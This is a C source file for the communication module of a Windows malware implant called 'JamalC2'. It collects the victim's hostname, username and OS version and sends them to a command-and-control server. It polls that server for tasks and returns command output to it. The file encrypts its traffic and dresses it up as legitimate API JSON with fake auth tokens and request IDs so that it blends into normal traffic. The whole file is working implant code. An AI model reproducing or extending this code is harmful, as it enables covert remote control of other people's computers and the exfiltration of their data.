/*
 * JamalC2 Implant - Protocol Implementation
 * Handles communication with C2 server
 */

#include "protocol.h"
#include "config.h"
#include "http.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

// Global client ID (shared across checkin and beacon)
char g_client_id[40] = {0};

// Simple JSON helper - find string value (with JSON unescaping)
static char *json_get_string(const char *json, const char *key) {
  char search[128];
  snprintf(search, sizeof(search), "\"%s\":\"", key);

  const char *start = strstr(json, search);
  if (!start)
    return NULL;

  start += strlen(search);

  // 找到字符串结束位置（需要跳过转义的引号）
  const char *end = start;
  while (*end) {
    if (*end == '"') {
      // 检查这个引号是否被转义（数一下前面有多少个反斜杠）
      int backslash_count = 0;
      const char *p = end - 1;
      while (p >= start && *p == '\\') {
        backslash_count++;
        p--;
      }
      // 如果反斜杠数量是偶数，则引号未被转义
      if (backslash_count % 2 == 0) {
        break;
      }
    }
    end++;
  }
  if (!*end)
    return NULL;

  size_t len = end - start;
  char *value = safe_malloc(len + 1);

  // JSON 反转义：将 \\ 转换为 \，\n 转换为换行等
  char *dst = value;
  const char *src = start;
  while (src < end) {
    if (*src == '\\' && src + 1 < end) {
      src++;
      switch (*src) {
      case '\\':
        *dst++ = '\\';
        break;
      case 'n':
        *dst++ = '\n';
        break;
      case 'r':
        *dst++ = '\r';
        break;
      case 't':
        *dst++ = '\t';
        break;
      case '"':
        *dst++ = '"';
        break;
      default:
        *dst++ = *src;
        break;
      }
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';

  return value;
}

// Simple JSON helper - find integer value
static int json_get_int(const char *json, const char *key) {
  char search[128];
  snprintf(search, sizeof(search), "\"%s\":", key);

  const char *start = strstr(json, search);
  if (!start)
    return 0;

  start += strlen(search);
  return atoi(start);
}

// Generate random hex string for request ID
static void generate_request_id(char *buf, size_t len) {
  static const char hex[] = "0123456789abcdef";

  // Calculate how many bytes we need (2 hex chars per byte)
  size_t hex_len = len - 1; // Leave room for null terminator
  size_t bytes_needed = (hex_len + 1) / 2;
  if (bytes_needed > 32)
    bytes_needed = 32; // Max 32 bytes

  uint8_t random[32];
  random_bytes(random, bytes_needed);

  size_t j = 0;
  for (size_t i = 0; i < bytes_needed && j + 1 < len; i++) {
    buf[j++] = hex[(random[i] >> 4) & 0xF];
    if (j < len - 1) {
      buf[j++] = hex[random[i] & 0xF];
    }
  }
  buf[j] = '\0';
}

// Generate UUID-like client ID
static void generate_client_id(char *buf) {
  uint8_t random[16];
  random_bytes(random, sizeof(random));

  snprintf(
      buf, 37,
      "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
      random[0], random[1], random[2], random[3], random[4], random[5],
      random[6], random[7], random[8], random[9], random[10], random[11],
      random[12], random[13], random[14], random[15]);
}

// Build request body with disguise
static char *build_request_body(CryptoContext *crypto, const char *payload) {
  // Encrypt payload
  size_t payload_len = strlen(payload);
  size_t encrypted_size = CRYPTO_NONCE_SIZE + payload_len + CRYPTO_TAG_SIZE;
  uint8_t *encrypted = safe_malloc(encrypted_size);

  int encrypted_len = crypto_encrypt(crypto, (const uint8_t *)payload,
                                     payload_len, encrypted, encrypted_size);
  if (encrypted_len < 0) {
    free(encrypted);
    return NULL;
  }

  // Base64 encode
  char *encoded_data = base64_encode(encrypted, encrypted_len);
  free(encrypted);

  // Generate disguise fields
  char client_id[40];
  char request_id[33];
  char auth_token[65];

  generate_client_id(client_id);
  generate_request_id(request_id, sizeof(request_id));
  generate_request_id(auth_token, sizeof(auth_token));

  // Build JSON
  size_t body_size = 512 + strlen(encoded_data);
  char *body = safe_malloc(body_size);

  snprintf(body, body_size,
           "{"
           "\"apiVersion\":\"2.1.0\","
           "\"clientId\":\"%s\","
           "\"authToken\":\"Bearer %s\","
           "\"requestId\":\"req_%s\","
           "\"timestamp\":%lld,"
           "\"platform\":\"Windows\","
           "\"data\":\"%s\""
           "}",
           client_id, auth_token, request_id, (long long)time(NULL),
           encoded_data);

  free(encoded_data);
  return body;
}

// Parse response body
static char *parse_response_body(CryptoContext *crypto, const char *response) {
  // Extract "data" field
  char *encoded_data = json_get_string(response, "data");
  if (!encoded_data)
    return NULL;

  // Base64 decode
  uint8_t *encrypted = NULL;
  int encrypted_len = base64_decode(encoded_data, &encrypted);
  free(encoded_data);

  if (encrypted_len < 0 || !encrypted)
    return NULL;

  // Decrypt
  size_t decrypted_size = encrypted_len;
  uint8_t *decrypted = safe_malloc(decrypted_size);

  int decrypted_len = crypto_decrypt(crypto, encrypted, encrypted_len,
                                     decrypted, decrypted_size);
  free(encrypted);

  if (decrypted_len < 0) {
    free(decrypted);
    return NULL;
  }

  // Null-terminate
  decrypted = safe_realloc(decrypted, decrypted_len + 1);
  decrypted[decrypted_len] = '\0';

  return (char *)decrypted;
}

void protocol_get_sysinfo(SystemInfo *info) {
  char buf[256];

  // Hostname
  DWORD size = sizeof(buf);
  if (GetComputerNameA(buf, &size)) {
    info->hostname = safe_strdup(buf);
  } else {
    info->hostname = safe_strdup("unknown");
  }

  // Username
  size = sizeof(buf);
  if (GetUserNameA(buf, &size)) {
    info->username = safe_strdup(buf);
  } else {
    info->username = safe_strdup("unknown");
  }

  // OS Version - Use RtlGetVersion to get real version (GetVersionEx lies on
  // Win8.1+)
  typedef NTSTATUS(WINAPI * RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
  RTL_OSVERSIONINFOW osvi;
  ZeroMemory(&osvi, sizeof(osvi));
  osvi.dwOSVersionInfoSize = sizeof(osvi);

  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  if (ntdll) {
    RtlGetVersionPtr RtlGetVersion =
        (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (RtlGetVersion && RtlGetVersion(&osvi) == 0) {
      // Convert to friendly name
      const char *version_name = "Windows";
      if (osvi.dwMajorVersion == 10) {
        if (osvi.dwBuildNumber >= 22000) {
          version_name = "Windows 11";
        } else {
          version_name = "Windows 10";
        }
      } else if (osvi.dwMajorVersion == 6) {
        if (osvi.dwMinorVersion == 3)
          version_name = "Windows 8.1";
        else if (osvi.dwMinorVersion == 2)
          version_name = "Windows 8";
        else if (osvi.dwMinorVersion == 1)
          version_name = "Windows 7";
        else if (osvi.dwMinorVersion == 0)
          version_name = "Windows Vista";
      }
      snprintf(buf, sizeof(buf), "%s (Build %lu)", version_name,
               osvi.dwBuildNumber);
      info->os_version = safe_strdup(buf);
    } else {
      info->os_version = safe_strdup("Windows");
    }
  } else {
    info->os_version = safe_strdup("Windows");
  }

  // IP Address (placeholder)
  info->ip_address = safe_strdup("0.0.0.0");

  // Tag
  info->tag = safe_strdup(TAG);
}

void protocol_free_sysinfo(SystemInfo *info) {
  if (info->hostname) {
    free(info->hostname);
    info->hostname = NULL;
  }
  if (info->username) {
    free(info->username);
    info->username = NULL;
  }
  if (info->os_version) {
    free(info->os_version);
    info->os_version = NULL;
  }
  if (info->ip_address) {
    free(info->ip_address);
    info->ip_address = NULL;
  }
  if (info->tag) {
    free(info->tag);
    info->tag = NULL;
  }
}

int protocol_checkin(CryptoContext *crypto, SystemInfo *info) {
  // Generate client_id if needed (using global g_client_id)
  if (g_client_id[0] == '\0') {
    generate_client_id(g_client_id);
  }

  // Build inner payload matching ClientIdentification struct
  // 动态分配避免固定缓冲区截断
  const char *os_ver = info->os_version ? info->os_version : "";
  const char *uname = info->username ? info->username : "";
  const char *hname = info->hostname ? info->hostname : "";
  const char *itag = info->tag ? info->tag : "";

  size_t inner_size = 256 + strlen(g_client_id) + strlen(VERSION) +
                      strlen(os_ver) + strlen(uname) + strlen(hname) +
                      strlen(itag);
  char *inner_payload = safe_malloc(inner_size);
  snprintf(inner_payload, inner_size,
           "{\"id\":\"%s\","
           "\"version\":\"%s\","
           "\"operating_system\":\"%s\","
           "\"account_type\":\"User\","
           "\"country\":\"Unknown\","
           "\"username\":\"%s\","
           "\"pc_name\":\"%s\","
           "\"tag\":\"%s\"}",
           g_client_id, VERSION, os_ver, uname, hname, itag);

  // Build C2Request format: {type, client_id, payload}
  size_t payload_size = 128 + strlen(g_client_id) + strlen(inner_payload);
  char *payload = safe_malloc(payload_size);
  snprintf(payload, payload_size,
           "{\"type\":\"checkin\","
           "\"client_id\":\"%s\","
           "\"payload\":%s}",
           g_client_id, inner_payload);
  free(inner_payload);

  // Build request
  char *body = build_request_body(crypto, payload);
  free(payload);
  if (!body) {
    DEBUG_PRINT("    [!] Failed to build request body\n");
    return -1;
  }
  DEBUG_PRINT("    [*] Request body built (%zu bytes)\n", strlen(body));

  // Send request
  DEBUG_PRINT("    [*] Sending HTTP POST to %s:%d%s\n", SERVER_HOST,
              SERVER_PORT, API_CHECKIN);
  HttpResponse response;
  int ret = http_post(SERVER_HOST, SERVER_PORT, USE_TLS, API_CHECKIN, body,
                      strlen(body), &response);
  free(body);

  DEBUG_PRINT("    [*] HTTP result: ret=%d, status=%d\n", ret,
              response.status_code);

  if (ret != 0 || response.status_code != 200) {
    DEBUG_PRINT("    [!] Checkin HTTP failed\n");
    http_response_free(&response);
    return -1;
  }

  DEBUG_PRINT("    [+] Checkin HTTP success\n");
  http_response_free(&response);
  return 0;
}

int protocol_beacon(CryptoContext *crypto, Task **tasks, int *task_count) {
  *tasks = NULL;
  *task_count = 0;

  // Use the same client_id as checkin
  extern char g_client_id[40]; // Defined in protocol_checkin

  // Build C2Request format with empty payload for beacon
  char payload[256];
  snprintf(payload, sizeof(payload),
           "{\"type\":\"beacon\","
           "\"client_id\":\"%s\","
           "\"payload\":{}}",
           g_client_id);

  // Build request
  char *body = build_request_body(crypto, payload);
  if (!body)
    return -1;

  // Send request
  HttpResponse response;
  int ret = http_post(SERVER_HOST, SERVER_PORT, USE_TLS, API_CHECKIN, body,
                      strlen(body), &response);
  free(body);

  if (ret != 0 || response.status_code != 200) {
    http_response_free(&response);
    return -1;
  }

  // Parse response
  char *decrypted = parse_response_body(crypto, response.body);
  http_response_free(&response);

  if (!decrypted) {
    DEBUG_PRINT("    [DEBUG] parse_response_body returned NULL\n");
    return 0; // No tasks
  }

  DEBUG_PRINT("    [DEBUG] Decrypted beacon response (%zu bytes): %.300s\n",
              strlen(decrypted), decrypted);

  // Parse tasks from decrypted JSON
  // Format: {"tasks":[{"id":"...","command":1,"args":"..."},...]}
  const char *tasks_start = strstr(decrypted, "\"tasks\":[");
  if (!tasks_start) {
    DEBUG_PRINT("    [DEBUG] No 'tasks' key found in response\n");
    free(decrypted);
    return 0;
  }

  // Count tasks (simple counting of "id" occurrences)
  int count = 0;
  const char *p = tasks_start;
  DEBUG_PRINT("    [DEBUG] tasks_start offset: %d, remaining: %.100s\n",
              (int)(tasks_start - decrypted), tasks_start);
  while ((p = strstr(p, "\"id\":")) != NULL) {
    count++;
    DEBUG_PRINT("    [DEBUG] Found 'id' #%d at offset %d\n", count,
                (int)(p - decrypted));
    p++;
  }
  DEBUG_PRINT("    [DEBUG] Total id count: %d\n", count);

  if (count == 0) {
    free(decrypted);
    return 0;
  }

  // Allocate tasks
  *tasks = safe_malloc(count * sizeof(Task));
  *task_count = 0;

  // Parse each task
  p = tasks_start + 9; // Skip past "tasks":["
  for (int i = 0; i < count; i++) {
    const char *obj_start = strchr(p, '{');
    if (!obj_start)
      break;

    // 层级感知的括号匹配，支持 args 中包含 } 的情况
    const char *scan = obj_start + 1;
    int depth = 1;
    int in_string = 0;
    while (*scan && depth > 0) {
      if (*scan == '"') {
        // 计算引号前连续反斜杠的个数
        int backslash_count = 0;
        const char *bp = scan - 1;
        while (bp >= obj_start && *bp == '\\') {
          backslash_count++;
          bp--;
        }
        // 偶数个反斜杠 = 引号未被转义（结束/开始字符串）
        if (backslash_count % 2 == 0) {
          in_string = !in_string;
        }
      } else if (!in_string) {
        if (*scan == '{')
          depth++;
        else if (*scan == '}')
          depth--;
      }
      if (depth > 0)
        scan++;
    }
    if (depth != 0)
      break;
    const char *obj_end = scan;

    // Extract fields
    size_t obj_len = obj_end - obj_start + 1;
    char *obj = safe_malloc(obj_len + 1);
    memcpy(obj, obj_start, obj_len);
    obj[obj_len] = '\0';

    (*tasks)[*task_count].id = json_get_string(obj, "id");
    (*tasks)[*task_count].command = json_get_int(obj, "command");
    (*tasks)[*task_count].args = json_get_string(obj, "args");

    free(obj);
    (*task_count)++;

    p = obj_end + 1;
  }

  free(decrypted);
  return 0;
}

int protocol_send_result(CryptoContext *crypto, const char *task_id,
                         int success, const char *output) {
  // Base64 encode output
  char *encoded_output = base64_encode((const uint8_t *)output, strlen(output));

  // Build inner payload (result data)
  size_t inner_size = 256 + strlen(encoded_output);
  char *inner_payload = safe_malloc(inner_size);
  snprintf(inner_payload, inner_size,
           "{\"task_id\":\"%s\","
           "\"success\":%s,"
           "\"output\":\"%s\"}",
           task_id, success ? "true" : "false", encoded_output);
  free(encoded_output);

  // Build C2Request format: {type, client_id, payload}
  size_t payload_size = 256 + strlen(inner_payload);
  char *payload = safe_malloc(payload_size);
  snprintf(payload, payload_size,
           "{\"type\":\"result\","
           "\"client_id\":\"%s\","
           "\"payload\":%s}",
           g_client_id, inner_payload);
  free(inner_payload);

  // Build request
  char *body = build_request_body(crypto, payload);
  free(payload);
  if (!body)
    return -1;

  // Send request
  HttpResponse response;
  int ret = http_post(SERVER_HOST, SERVER_PORT, USE_TLS, API_RESULT, body,
                      strlen(body), &response);
  free(body);

  int status = response.status_code;
  http_response_free(&response);
  return (ret == 0 && status == 200) ? 0 : -1;
}

void protocol_free_tasks(Task *tasks, int count) {
  if (!tasks)
    return;

  for (int i = 0; i < count; i++) {
    if (tasks[i].id)
      free(tasks[i].id);
    if (tasks[i].args)
      free(tasks[i].args);
  }
  free(tasks);
}
